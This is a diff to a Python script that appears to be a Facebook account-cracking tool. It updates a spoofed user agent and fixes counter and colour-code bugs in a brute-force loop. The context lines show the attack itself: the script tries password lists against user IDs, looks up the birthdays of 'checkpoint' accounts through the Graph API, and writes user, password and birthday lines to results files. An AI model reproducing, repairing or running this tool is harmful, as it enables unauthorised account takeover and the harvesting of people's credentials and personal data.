@@ -467,7 +467,7 @@ def log_hasil(user, pasw):
         "accept-encoding":"gzip, deflate",
         "accept-language":"id-ID,id;q=0.9",
         "referer":"https://mbasic.facebook.com/",
-        "user-agent":"NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+;]"
+        "user-agent":"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"
     })
     soup=BeautifulSoup(session.get(url_mb+"/login/?next&ref=dbl&fl&refid=8").text,"html.parser")
     link=soup.find("form",{"method":"post"})
@@ -632,7 +632,7 @@ class __crack__:
     def __api__(self, user, __yan__):
         global ok,cp,loop
         for i in list('\|-/'):
-            sys.stdout.write('\r \x1b[0;93m[%s%s%s\x1b[0;93m][\x1b[0;97mKENTOD\x1b[0;93m][\x1b[0;97m%s/%s\x1b[0;93m]\x1b[0;97mOKEH:%s\x1b[0;93m][\x1b[0;97mCEPEH:%s\x1b[0;93m]'%(O,i,N,loop,len.get("id"),len(ok),len(cp))),
+            sys.stdout.write('\r \x1b[0;93m[%s%s%s\x1b[0;93m][\x1b[0;97mKENTOD\x1b[0;93m][\x1b[0;97m%s/%s\x1b[0;93m]\x1b[0;97mOKEH:%s\x1b[0;93m][\x1b[0;97mCEPEH:%s\x1b[0;93m]'%(O,i,N,loop,len(self.id),len(ok),len(cp))),
             sys.stdout.flush()
         for pw in __yan__:
             pw = pw.lower()
@@ -664,7 +664,7 @@ class __crack__:
                     cp_ttl = requests.get('https://graph.facebook.com/%s?fields=birthday&access_token=%s'%(user,kontol)).json()['birthday']
                     month, day, year = cp_ttl.split('/')
                     month = bulan_ttl[month]
-                    print('\r %s[CP] %s • %s • %s %s %s     %s' % (U,user,pw,day,month,year,N))
+                    print('\r %s[CP] %s • %s • %s %s %s     %s' % (K,user,pw,day,month,year,N))
                     wrt = ' [×] %s|%s|%s %s %s' % (user,pw,day,month,year)
                     cp.append(wrt)
                     open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
@@ -675,7 +675,7 @@ class __crack__:
                     year  = ''
                 except:
                     pass
-                print('\r %s[CP] %s • %s                %s' % (U,user,pw,N))
+                print('\r %s[CP] %s • %s                %s' % (K,user,pw,N))
                 wrt = ' [×] %s|%s' % (user,pw)
                 cp.append(wrt)
                 open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
@@ -686,7 +686,7 @@ class __crack__:
     def __mbasic__(self, user, __yan__):
         global ok,cp,loop
         for i in list('\|-/'):
-            sys.stdout.write('\r \x1b[0;93m[%s%s%s\x1b[0;93m][\x1b[0;97mKENTOD\x1b[0;93m][\x1b[0;97m%s/%s\x1b[0;93m]\x1b[0;97mOKEH:%s\x1b[0;93m][\x1b[0;97mCEPEH:%s\x1b[0;93m]'%(O,i,N,loop,len.get("id"),len(ok),len(cp))),
+            sys.stdout.write('\r \x1b[0;93m[%s%s%s\x1b[0;93m][\x1b[0;97mKENTOD\x1b[0;93m][\x1b[0;97m%s/%s\x1b[0;93m]\x1b[0;97mOKEH:%s\x1b[0;93m][\x1b[0;97mCEPEH:%s\x1b[0;93m]'%(O,i,N,loop,len(self.id),len(ok),len(cp))),
             sys.stdout.flush()
         for pw in __yan__:
             pw = pw.lower()
@@ -713,7 +713,7 @@ class __crack__:
                     cp_ttl = requests.get('https://graph.facebook.com/%s?fields=birthday&access_token=%s'%(user,kontol)).json()['birthday']
                     month, day, year = cp_ttl.split('/')
                     month = bulan_ttl[month]
-                    print('\r %s[CP] %s • %s • %s %s %s     %s' % (U,user,pw,day,month,year,N))
+                    print('\r %s[CP] %s • %s • %s %s %s     %s' % (K,user,pw,day,month,year,N))
                     wrt = ' [×] %s|%s|%s %s %s' % (user,pw,day,month,year)
                     cp.append(wrt)
                     open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
@@ -724,7 +724,7 @@ class __crack__:
                     year  = ''
                 except:
                     pass
-                print('\r %s[CP] %s • %s                %s' % (U,user,pw,N))
+                print('\r %s[CP] %s • %s                %s' % (K,user,pw,N))
                 wrt = ' [×] %s|%s' % (user,pw)
                 cp.append(wrt)
                 open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
@@ -735,7 +735,7 @@ class __crack__:
     def __mfb__(self, user, __yan__):
         global ok,cp,loop
         for i in list('\|-/'):
-            sys.stdout.write('\r \x1b[0;95m[%s%s%s\x1b[0;95m][\x1b[0;97mKENTOD\x1b[0;95m][\x1b[0;97m%s/%s\x1b[0;95m]\x1b[0;97mOKEH:%s\x1b[0;95m][\x1b[0;97mCEPEH:%s\x1b[0;95m]'%(O,i,N,loop,len(self.id),len(ok),len(cp))),
+            sys.stdout.write('\r \x1b[0;93m[%s%s%s\x1b[0;93m][\x1b[0;97mKENTOD\x1b[0;93m][\x1b[0;97m%s/%s\x1b[0;93m]\x1b[0;97mOKEH:%s\x1b[0;93m][\x1b[0;97mCEPEH:%s\x1b[0;93m]'%(O,i,N,loop,len(self.id),len(ok),len(cp))),
             sys.stdout.flush()
         for pw in __yan__:
             pw = pw.lower()
@@ -762,7 +762,7 @@ class __crack__:
                     cp_ttl = requests.get('https://graph.facebook.com/%s?fields=birthday&access_token=%s'%(user,kontol)).json()['birthday']
                     month, day, year = cp_ttl.split('/')
                     month = bulan_ttl[month]
-                    print('\r %s[CP] %s • %s • %s %s %s     %s' % (U,user,pw,day,month,year,N))
+                    print('\r %s[CP] %s • %s • %s %s %s     %s' % (K,user,pw,day,month,year,N))
                     wrt = ' [×] %s|%s|%s %s %s' % (user,pw,day,month,year)
                     cp.append(wrt)
                     open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
@@ -773,7 +773,7 @@ class __crack__:
                     year  = ''
                 except:
                     pass
-                print('\r %s[CP] %s • %s                %s' % (U,user,pw,N))
+                print('\r %s[CP] %s • %s                %s' % (K,user,pw,N))
                 wrt = ' [×] %s|%s' % (user,pw)
                 cp.append(wrt)
                 open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
